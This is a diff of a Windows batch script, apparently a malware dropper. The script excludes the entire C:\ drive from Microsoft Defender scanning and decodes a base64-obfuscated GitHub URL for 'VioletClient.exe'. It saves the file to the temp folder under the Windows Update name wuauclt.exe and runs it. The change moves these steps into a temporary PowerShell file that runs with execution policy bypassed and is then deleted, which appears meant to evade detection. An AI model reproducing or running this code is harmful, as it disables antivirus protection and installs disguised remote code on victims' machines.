@@ -45,13 +45,16 @@ if %adminCheck% == 1 (
     setlocal
     set "exeFile=%TEMP%\wuauclt.exe"
     set "url1=aHR0cHM6Ly9naXRodWIuY29tL3ZhdWx0MDUzMDA5LW1ha2VyL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9WaW9sZXRDbGllbnQuZXhl"
-    set "downloadCmd=$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
     set "a1=Add-MpPreference"
     set "a2=-ExclusionPath"
     set "a3='C:\'"
     set "defenderCmd=%a1% %a2% %a3%"
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "%defenderCmd%"
-    powershell -Command "%downloadCmd%"
+    set "downloadCmd=$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
+    set "ps1=%TEMP%\temp.ps1"
+    echo %defenderCmd% > "%ps1%"
+    echo %downloadCmd% >> "%ps1%"
+    powershell -NoProfile -ExecutionPolicy Bypass -File "%ps1%"
+    del "%ps1%"
     start "" "%exeFile%"
     endlocal
     exit
